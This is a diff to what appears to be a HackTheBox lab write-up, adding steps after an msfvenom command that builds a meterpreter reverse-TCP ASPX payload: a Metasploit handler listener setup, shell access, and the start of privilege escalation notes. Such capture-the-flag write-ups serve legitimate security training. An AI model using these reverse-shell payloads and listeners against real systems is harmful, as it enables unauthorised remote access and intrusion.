@@ -81,3 +81,31 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.20 lport=1337 -f aspx
 8. It's stuck there, confused why.
 9. Succeed got shell after used the msfconsole listener.
 
+
+> How to setup
+
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost tun0
+set lport 1337
+exploit
+```
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/126da244-7e93-469e-b608-c196d4208828)
+
+
+10. Seems like we need to do privesc even to get the user flag.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c4fb1d32-d90a-4cf4-9227-6d5068d87d18)
+
+
+11. Let's run a suggester.
+12. Running ps, we know that we don't need to migrate. Because w3wp.exe is used to run webapp for IIS.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/14b507b2-7327-4695-9c1c-fd730e8b65ed)
+
+
+> RESULT FOR SUGGESTER
+
